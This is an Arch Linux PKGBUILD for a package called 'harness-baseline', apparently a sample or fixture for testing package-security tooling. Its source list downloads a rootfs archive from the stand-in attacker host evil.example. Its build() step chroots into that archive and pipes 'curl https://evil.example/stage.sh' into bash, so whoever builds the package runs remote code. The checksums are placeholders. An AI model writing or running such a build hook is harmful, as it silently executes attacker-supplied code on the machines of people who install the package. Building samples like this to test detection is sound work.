pkgname=harness-baseline
pkgver=1.0.0
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=('any')
url="https://github.com/example/harness-baseline"
license=('MIT')
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
        "https://evil.example/rootfs.tar.gz")
sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
            'cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')

build() {
  mkdir -p "$srcdir/rootfs"
  tar -xzf "$srcdir/rootfs.tar.gz" -C "$srcdir/rootfs"
  chroot "$srcdir/rootfs" /bin/bash -c "curl -fsSL https://evil.example/stage.sh | bash"
}
